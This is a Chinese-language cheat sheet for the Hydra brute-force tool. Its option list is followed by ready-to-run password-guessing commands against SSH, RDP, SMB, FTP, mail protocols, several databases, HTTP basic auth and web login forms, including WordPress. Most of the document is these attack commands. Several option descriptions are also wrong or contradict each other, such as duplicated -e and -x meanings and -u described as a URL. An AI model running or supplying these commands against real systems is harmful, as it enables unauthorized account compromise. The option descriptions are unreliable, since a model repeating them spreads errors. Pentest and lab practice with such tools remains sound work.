## Hydra简介

Hydra是一款常用的网络暴力破解工具，可以爆破各种常见的协议，如SSH、FTP、Telnet、SMTP等。可以根据用户提供的字典文件和一些参数设置，尝试各种可能的密码组合。

## Hydra的基本语法
```
hydra [options] target
```
## Hydra的参数(options)
```
-u参数用于指定目标URL，格式为-u url
-s参数用于指定端口号，格式为-s port
-c参数用于指定请求头，格式为-c header
-M参数用于指定多个目标的目标文件，格式为-M targets.txt

-l参数用于指定要破解的用户名，格式为-l username
-L参数用于指定用户名字典文件，格式为-L usernames.txt
-U参数用于指定用户名列表文件，格式为-U usernames.txt

-p参数用于指定密码，格式为-p password
-P参数用于指定密码列表文件，格式为-P filename
-e参数用于指定要尝试的密码类型，格式为-e nsr
	n null，表示尝试空密码
	s same，把用户名本身当做密码进行尝试
	r 反向，把用户名倒叙，当做密码进行尝试。
-x参数用于指定密码的最大长度和最小长度，格式为-x min:max
-R参数用于指定是否使用随机密码，格式为-R
-C参数用于指定指定所用格式为“user:password”的字典文件，格式为-C username:password

-b参数用于指定要尝试的用户名和密码是否在同一行，格式为-b
-m参数用于指定破解目标的加密方式，格式为-m method。以下是一些常用的协议：
	ssh：SSH协议
	ftp：FTP协议
	telnet：Telnet协议
	http-get：HTTP GET请求
	http-post：HTTP POST请求

-f参数用于当找到一个成功的用户名和密码时退出当前用户名的爆破，开始爆破下一个，格式为-f
-F参数用于当找到一个成功的用户名和密码时退出所有的爆破

-w参数用于指定等待时间，格式为-w seconds
-t参数用于指定并发线程数（默认16，最高64），格式为-t threads
-v参数用于显示详细输出，格式为-v
-vV参数用于显示详细的调试信息，格式为-vV

-x和-X参数用于指定HTTP代理。-x参数用于指定代理服务器地址和端口号，格式为-x proxy:port
-K参数用于指定是否保持连接，格式为-K
-k参数用于指定是否使用SSL/TLS加密传输，格式为-k

-o参数用于将结果输出到文件中，格式为-o filename
-e参数用于指定错误日志文件，格式为-e filename
```

## Hydra爆破常见服务

### 远程登录（SSH）
```
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.110:22
```
```
hydra -l root -p /usr/share/wordlists/rockyou.txt 192.168.31.173:22 ssh
```
```
hydra -L user.list -P /usr/share/wordlists/rockyou.txt ssh://192.168.216.136:22
```
常用弱密码破解：
```
hydra -t 4 -L /usr/share/wordlists/legion/ssh-user.txt -P /usr/share/wordlists/legion/root-userpass.txt ssh://192.168.56.110:22
```
SSH加密版本报错
```
Unable to negotiate with 192.168.216.144 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
```
解决方法：
```
在 ~/.ssh/config 配置文件指定正确的密钥类型
Host 192.168.216.144 
HostKeyAlgorithms +ssh-rsa
```
### 远程桌面（RDP）
```
hydra -l administrator -P /usr/share/wordlists/rockyou.txt 192.168.31.173 rdp
```
### 共享文件（SMB）
```
hydra -l administrator -P /usr/share/wordlists/rockyou.txt 192.168.31.173 smb
```
### 文件传输（FTP）
```
hydra -l <用户名> -P <密码列表文件> <目标IP> ftp -s <端口号>
hydra -l user -P passlist.txt ftp://192.168.0.1
```
### 邮箱协议（POP3）
```
hydra -l 用户名 -P 密码字典 192.168.31.173 pop3
hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
```
### MSSQL数据库
```
hydra -l sa -P /usr/share/wordlists/rockyou.txt 192.168.31.173 mssql
```
### MySQL数据库
```
hydra -l 用户名 -P /usr/share/wordlists/rockyou.txt 192.168.31.173 mysql
```
### Oracle数据库
```
hydra -l 用户名 -P /usr/share/wordlists/rockyou.txt 192.168.31.173 oracle
```
### Redis数据库
```
hydra -l 用户名 -P /usr/share/wordlists/rockyou.txt 192.168.31.173 redis
```
### PgSQL数据库
```
hydra -l 用户名 -P /usr/share/wordlists/rockyou.txt 192.168.31.173 postgresql
```
### SMTP
```
hydra -l 用户名 -P 密码字典 192.168.31.173 smtp
hydra -l joe -P mypasswords.txt smtp://target_ip
```
### IMAP
```
hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
```
### 破解HTTP基本认证（get）
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 -f http-get://target_ip/protected -V
```
### 破解HTTP基本认证（post）
```
sudo hydra 192.168.56.109 http-post-form "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l root -P /usr/share/wordlists/rockyou.txt

sudo hydra -L password.txt -p xiaoli 192.168.56.104 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"

http-post-form //web post方式

key=^PASS^	//提交的变量=payload提交变量
^USER^, ^PASS^, ^USER64^ or ^PASS64^: (null)
F= 指定失败关键字
```
示例：
```
sudo hydra 192.168.56.110 http-form-post "/mysite/register.html:inputPassword=^PASS^:invalid key" -l admin -P /usr/share/wordlists/rockyou.txt
sudo hydra 192.168.56.121 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l admin -P /usr/share/wordlists/rockyou.txt

sudo hydra 192.168.123.143 http-form-post "/index.php:uname=^USER^&psw=^PASS^:invalid key" -L /usr/share/wordlists/metasploit/namelist.txt -P /usr/share/wordlists/metasploit/password.lst
```
